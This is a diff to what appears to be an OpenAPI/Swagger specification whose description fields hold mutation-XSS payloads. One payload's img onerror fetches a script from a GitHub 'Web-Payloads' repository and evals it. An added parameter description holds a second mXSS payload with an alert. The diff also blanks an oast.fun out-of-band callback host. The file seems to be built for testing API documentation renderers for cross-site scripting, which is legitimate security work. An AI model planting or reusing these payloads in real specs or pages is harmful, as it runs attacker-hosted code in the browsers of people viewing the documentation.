@@ -6,7 +6,7 @@ description: |
     <math><mtext><h1><a><h6></a></h6><mglyph><svg><mtext><textarea><a title='</textarea><img src onerror=fetch(`https://raw.githubusercontent.com/itssixtyn3in/Web-Payloads/main/script.js`).then(function(res){res.text().then(function(data){eval(data)})})>'></textarea></h1>">"</textarea></desc></textarea></mtext></mtext></svg></mglyph></option></mtext></math>
 
     https://raw.githubusercontent.com/itssixtyn3in/Web-Payloads/main/script.js
-host: ckrk57m2vtc0000g9pz0gjhj1uhyyyyyb.oast.fun
+host: 
 
 paths:
 
@@ -14,6 +14,8 @@ paths:
     post:
       summary: Logs in
       parameters:
+              - description: |
+            <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img onerror=alert('textarea') src=1>"></form>
         - name: Username 
           required: true
           in: path
